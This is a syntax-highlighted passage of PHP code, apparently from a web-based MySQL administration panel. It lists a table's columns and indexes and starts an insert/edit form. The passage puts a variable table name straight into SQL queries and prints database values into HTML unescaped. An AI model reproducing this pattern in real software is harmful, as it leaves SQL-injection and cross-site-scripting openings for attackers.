<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Key'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Default'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Extra'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Privileges'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Comment'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">tbfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SHOW INDEX FROM $tablename"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">row</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_array(</span>$<span style="color: #eeeeec;">result</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span>[] = $<span style="color: #eeeeec;">row</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h3&gt;Indexes&lt;/h3&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Keyname&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Unique&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Packed&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Seq_in_index&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Cardinality&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">rowdb</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">row</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">thisbg</span> = <span style="color: #eeeeec; background-color: #2e3436;">bg(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'\';"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Key_name'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Index_type'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.($<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Non_unique'</span>] ? <span style="color: #ad7fa8; font-style: italic;">'No'</span> : <span style="color: #ad7fa8; font-style: italic;">'Yes'</span>).<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.($<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Packed'</span>] === <span style="color: #8ae234;">null</span> ? <span style="color: #ad7fa8; font-style: italic;">'No'</span> : $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Packed'</span>]).<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Seq_in_index'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Column_name'</span>].($<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Sub_part'</span>] ? <span style="color: #ad7fa8; font-style: italic;">'('</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Sub_part'</span>].<span style="color: #ad7fa8; font-style: italic;">')'</span> : <span style="color: #ad7fa8; font-style: italic;">''</span>).<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.($<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Cardinality'</span>] ? $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Cardinality'</span>] : <span style="color: #eeeeec; background-color: #2e3436;">0</span>).<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Collation'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Null'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Comment'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">tbfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'insert'</span> || $<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'edit'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">'SHOW COLUMNS FROM '</span>.$<span style="color: #eeeeec;">tablename</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> ($<span style="color: #eeeeec;">row</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_array(</span>$<span style="color: #eeeeec;">result</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span>[] = $<span style="color: #eeeeec;">row</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rs</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'insert'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Insert new line in '</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">' table &amp;raquo;&lt;/h2&gt;'</span>);
